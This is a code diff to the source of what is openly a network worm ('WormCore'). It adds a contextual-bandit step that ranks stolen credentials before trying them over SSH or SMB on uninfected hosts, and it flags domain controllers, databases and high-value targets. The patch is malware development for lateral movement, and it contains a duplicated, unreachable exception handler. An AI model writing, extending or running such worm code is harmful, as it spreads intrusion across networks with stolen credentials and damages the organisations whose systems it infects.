@@ -912,7 +912,7 @@ class WormCore:
         self.contextual_bandit = None
         if CONTEXTUAL_BANDIT_AVAILABLE:
             try:
-                self.contextual_bandit = ContextualBandit(alpha=0.3, gamma=0.9)
+                self.contextual_bandit = ContextualBandit(alpha=0.3)
                 logger.info("Contextual Bandit: enabled (LinUCB credential selection)")
             except Exception as e:
                 logger.warning(f"Contextual Bandit failed: {e}")
@@ -2144,6 +2144,28 @@ class WormCore:
         logger.info(
             f"Credential pivot: trying {len(discovered)} creds on {len(uninfected)} hosts"
         )
+
+        # Use contextual bandit to prioritize credentials
+        if self.contextual_bandit:
+            try:
+                host = uninfected[0]
+                ctx = {
+                    "service": "ssh" if 22 in host.get("open_ports", []) else "smb" if 445 in host.get("open_ports", []) else "unknown",
+                    "os": host.get("os_guess", "Unknown"),
+                    "ports": host.get("open_ports", []),
+                    "is_high_value": host.get("vulnerability_score", 0) > 70,
+                    "is_domain_controller": host.get("host_type") == "domain_controller",
+                    "is_database": host.get("host_type") == "database",
+                    "target_count": len(self.infected_hosts),
+                }
+                bandit_cred = self.contextual_bandit.select_credential(discovered, ctx)
+                if bandit_cred:
+                    username, password, ucb = bandit_cred
+                    discovered = [(username, password)] + [c for c in discovered if c != (username, password)]
+            except Exception:
+                pass
+            except Exception:
+                pass
 
         for username, password in discovered[:5]:
             for host in uninfected:
